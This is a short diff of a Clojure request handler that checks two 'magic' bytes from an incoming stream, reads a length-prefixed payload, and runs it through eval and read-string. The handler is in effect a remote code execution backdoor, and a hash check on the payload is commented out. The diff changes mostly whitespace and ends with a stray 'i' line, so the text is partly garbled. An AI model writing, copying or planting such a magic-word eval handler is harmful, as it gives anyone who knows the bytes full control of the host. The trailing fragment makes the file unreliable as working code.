@@ -1,13 +1,13 @@
-(fn [rq rs rf]
- (let [
+(fn[rq rs rf]
+ (let[
    formatHash
-    (fn [hash]
+    (fn[hash]
      (apply str
-      (map #(format "%02x" (bit-and % 0xff))
+      (map #(format "%02x"(bit-and % 0xff))
        hash)))
    ;MagicWord:
-   a (.readByte rf)
-   acc (.readByte rf)]
+   a(.readByte rf)
+   acc(.readByte rf)]
   (if (and (== (byte 10) a) (== (byte 7) acc))
    (let [
      t (.readByte rf)]
@@ -25,6 +25,8 @@
       size (.readInt rf)
       sx (byte-array size)]
      (.read rf sx)
+
      ((eval (read-string (String. sx))) rq rs rf)))
     ;start reached!: (if (.equals "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b" (formatHash x))
    "MagicWord mismatch!"))))))
+i
